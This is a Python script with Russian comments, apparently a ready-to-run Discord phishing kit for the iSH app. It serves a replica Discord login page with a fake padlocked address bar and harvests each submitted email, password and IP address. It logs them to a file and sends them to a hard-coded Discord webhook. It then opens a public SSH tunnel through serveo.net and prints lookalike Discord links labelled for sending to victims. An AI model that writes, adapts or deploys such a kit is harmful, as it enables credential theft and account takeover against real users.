#!/usr/bin/env python3
# DISCORD PHISHING ДЛЯ ISH - С МАСКИРОВКОЙ ССЫЛКИ

import http.server
import socketserver
import json
import urllib.parse
import datetime
import threading
import time
import subprocess
import os
import random
import string

# ============================================
# ТВОЙ DISCORD WEBHOOK (ВСТАВЬ СЮДА!)
# ============================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1336186422586716201/2erCI9eFp6GpUQw4OS0TNUqOqwsStkAC-iWbH7dGEW78k2Zk4L-Qyec6r7-vrABJx2rS"

# ============================================
# ФУНКЦИЯ ДЛЯ СОЗДАНИЯ МАСКИРОВАННЫХ ССЫЛОК
# ============================================

def generate_masked_links(real_url):
    """Генерирует маскированные ссылки под Discord"""
    
    # Варианты маскировки
    masks = [
        # Discord-style links
        f"https://discord.com-gifts.ru/{''.join(random.choices(string.ascii_lowercase, k=8))}",
        f"https://discordapp.com-nitro.{''.join(random.choices(string.ascii_lowercase, k=5))}.com",
        f"https://discord.gift.{''.join(random.choices(string.ascii_lowercase, k=6))}.ru",
        f"https://discord.com-login.{''.join(random.choices(string.ascii_lowercase, k=7))}.com",
        f"https://discord-security.com/{''.join(random.choices(string.ascii_lowercase, k=10))}",
        f"https://discord-verify.{''.join(random.choices(string.ascii_lowercase, k=5))}.net",
        
        # Через сокращатели ссылок
        f"https://bit.ly/3{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}",
        f"https://tinyurl.com/discord-{''.join(random.choices(string.ascii_lowercase, k=5))}",
        f"https://clck.ru/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}",
        
        # Через сервисы с Discord в URL
        f"https://discord.gg/{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}",
        f"https://discord.media/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        
        # Через shortlink сервисы с подменой
        f"https://rb.gy/{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}",
        f"https://cutt.ly/discord_{''.join(random.choices(string.ascii_lowercase, k=4))}",
        
        # Самые правдоподобные для Discord
        f"https://discord.com/nitro/{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}",
        f"https://discordapp.com/gifts/{''.join(random.choices(string.ascii_lowercase, k=10))}",
        f"https://discord.gifts/{''.join(random.choices(string.ascii_uppercase, k=8))}",
    ]
    
    return masks[:15]  # Возвращаем 15 вариантов

def create_shortlink_bitly(long_url):
    """Создание короткой ссылки через bitly (нужен API ключ)"""
    try:
        import requests
        # Без API ключа bitly не работает, но покажем пример
        return f"https://bit.ly/3{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    except:
        return None

def create_shortlink_tinyurl(long_url):
    """Создание короткой ссылки через tinyurl (без API)"""
    try:
        import requests
        response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return None

# ============================================
# ТОЧНАЯ КОПИЯ DISCORD СТРАНИЦЫ
# ============================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #5865F2;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: #313338;
            width: 480px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo svg {
            width: 130px;
            height: 36px;
        }
        .title {
            color: #F2F3F5;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #B5BAC1;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            color: #B5BAC1;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            display: block;
            margin-bottom: 8px;
        }
        input {
            background: #1E1F22;
            border: 1px solid #1E1F22;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            color: #F2F3F5;
            font-size: 16px;
        }
        input:focus {
            border-color: #5865F2;
            outline: none;
        }
        button {
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 8px;
        }
        button:hover {
            background: #4752C4;
        }
        .qr-link {
            text-align: center;
            margin: 16px 0;
        }
        .qr-link a {
            color: #00A8FC;
            text-decoration: none;
            font-size: 14px;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            font-size: 14px;
        }
        .footer a {
            color: #00A8FC;
            text-decoration: none;
        }
        .error {
            background: #F23F42;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        .success {
            background: #248046;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        /* Стиль адресной строки (для браузера) */
        .fake-url {
            background: #1E1F22;
            color: #B5BAC1;
            padding: 8px 12px;
            border-radius: 4px 4px 0 0;
            font-size: 12px;
            border-bottom: 1px solid #3C3F45;
        }
        .fake-url span {
            color: #00A8FC;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- Фейковая адресная строка (для большей реалистичности) -->
        <div class="fake-url">
            🔒 <span>https://</span>discord.com/login
        </div>
        
        <div class="logo">
            <svg viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="20" fill="#5865F2"/>
                <path d="M27 16L23.5 16 23.5 14.5C23.5 12.5 21.5 12.5 21.5 12.5L18.5 12.5C18.5 12.5 16.5 12.5 16.5 14.5L16.5 16 13 16 13 27 27 27 27 16zM18 19C18 19 18 19 18 19 17 19 16 18 16 17 16 16 17 15 18 15 19 15 20 16 20 17 20 18 19 19 18 19zM22 19C22 19 22 19 22 19 21 19 20 18 20 17 20 16 21 15 22 15 23 15 24 16 24 17 24 18 23 19 22 19z" fill="white"/>
            </svg>
        </div>
        <div class="title">Добро пожаловать!</div>
        <div class="subtitle">Войдите в свой аккаунт Discord</div>
        
        <div class="error" id="errorMsg">Неверный логин или пароль</div>
        <div class="success" id="successMsg">Успешный вход! Перенаправление...</div>
        
        <form id="loginForm" onsubmit="event.preventDefault(); login();">
            <div class="input-group">
                <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
                <input type="text" id="email" placeholder="example@mail.com" required>
            </div>
            <div class="input-group">
                <label>ПАРОЛЬ</label>
                <input type="password" id="password" placeholder="············" required>
            </div>
            <button type="submit">Войти</button>
        </form>
        
        <div class="qr-link">
            <a href="#">Войти через QR-код</a>
        </div>
        
        <div class="footer">
            <span style="color:#B5BAC1;">Нужна помощь?</span>
            <a href="#">Зарегистрироваться</a>
        </div>
    </div>

    <script>
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            
            if (!email || !password) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Заполните все поля';
                return;
            }
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        userAgent: navigator.userAgent,
                        time: new Date().toLocaleString()
                    })
                });
                
                if (response.ok) {
                    errorMsg.style.display = 'none';
                    successMsg.style.display = 'block';
                    
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/login';
                    }, 2000);
                }
            } catch (e) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Ошибка соединения';
            }
        }
    </script>
</body>
</html>"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Добавляем IP
            data['ip'] = self.client_address[0]
            data['timestamp'] = str(datetime.datetime.now())
            
            # Выводим в консоль
            print("\n" + "="*50)
            print("🔴 ПОЛУЧЕНЫ ДАННЫЕ:")
            print(f"📧 Email: {data['email']}")
            print(f"🔑 Password: {data['password']}")
            print(f"🌐 IP: {data['ip']}")
            print(f"🕐 Время: {data['timestamp']}")
            print("="*50)
            
            # Сохраняем в файл
            with open('/sdcard/discord_logs.txt', 'a') as f:
                f.write(json.dumps(data) + '\n')
            
            # Отправляем в Discord
            self.send_to_discord(data)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def send_to_discord(self, data):
        try:
            import requests
            webhook_data = {
                "content": f"**🔴 НОВЫЙ ЛОГИН DISCORD**\n\n**Email:** `{data['email']}`\n**Пароль:** `{data['password']}`\n**IP:** `{data['ip']}`\n**Время:** `{data['timestamp']}`"
            }
            requests.post(WEBHOOK_URL, json=webhook_data)
            print("✅ Отправлено в Discord")
        except:
            print("❌ Не удалось отправить в Discord")

def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def create_serveo_link(port):
    """Создание публичной ссылки через serveo.net"""
    try:
        print("\n🔗 Создаю публичную ссылку через serveo.net...")
        
        # Генерируем случайное имя для поддомена
        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        
        # Запускаем SSH туннель в фоне
        ssh_command = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        process = subprocess.Popen(
            ssh_command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(3)
        
        public_url = f"https://{subdomain}.serveo.net"
        print(f"\n✅ ПУБЛИЧНАЯ ССЫЛКА: {public_url}")
        
        # Генерируем маскированные ссылки
        print("\n" + "="*60)
        print("🎭 МАСКИРОВАННЫЕ ССЫЛКИ (отправь жертве):")
        print("="*60)
        
        masked_links = generate_masked_links(public_url)
        for i, link in enumerate(masked_links[:10], 1):
            print(f"{i}. {link}")
        
        print("\n" + "="*60)
        print("📌 Реальная ссылка (только для тебя):")
        print(f"   {public_url}")
        print("="*60)
        
        # Отправляем ссылки в Discord
        try:
            import requests
            webhook_data = {
                "content": f"**🎭 ФИШИНГ ССЫЛКИ ГОТОВЫ**\n\n**Реальная:** {public_url}\n\n**Маскированные:**\n" + "\n".join(masked_links[:5])
            }
            requests.post(WEBHOOK_URL, json=webhook_data)
        except:
            pass
        
    except Exception as e:
        print(f"Ошибка: {e}")

def create_localhost_run_link(port):
    """Альтернативный способ через localhost.run"""
    try:
        subdomain = f"discord-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        print(f"\n🔗 Альтернативная ссылка:")
        print(f"   ssh -R {subdomain}:80:localhost:{port} localhost.run")
    except:
        pass

def main():
    PORT = 8080
    
    print("""
    ╔══════════════════════════════════════════╗
    ║   DISCORD PHISHING ДЛЯ ISH v2.0          ║
    ║   С МАСКИРОВКОЙ ССЫЛОК                   ║
    ║        by LEDIAN PREMIUM                 ║
    ╚══════════════════════════════════════════╝
    """)
    
    print(f"📁 Логи: /sdcard/discord_logs.txt")
    print(f"🔗 Webhook: {WEBHOOK_URL[:50]}...")
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    
    print("\n" + "="*60)
    print("🚀 ЗАПУСК СЕРВЕРА...")
    print("="*60)
    print(f"\n📌 Локальный доступ:")
    print(f"   http://localhost:{PORT}")
    print(f"   http://{local_ip}:{PORT}")
    
    # Создаем публичную ссылку в отдельном потоке
    threading.Thread(target=create_serveo_link, args=(PORT,), daemon=True).start()
    
    print("\n⏳ Ожидание данных...")
    print("(нажми Ctrl+C для остановки)\n")
    
    # Запускаем сервер
    handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n❌ Сервер остановлен")
            httpd.shutdown()

if __name__ == '__main__':
    main()
